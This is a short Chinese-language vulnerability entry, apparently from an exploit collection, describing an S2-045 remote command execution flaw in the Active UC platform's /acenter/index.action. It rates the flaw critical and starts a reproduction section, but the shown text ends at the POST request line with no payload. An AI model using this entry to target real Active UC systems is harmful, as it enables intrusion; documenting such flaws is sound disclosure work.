# Active UC index.action 远程命令执行漏洞

## 漏洞描述
网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202101923695.png)



发送如下请求包

```plain
POST /acenter/index.action HTTP/1.1
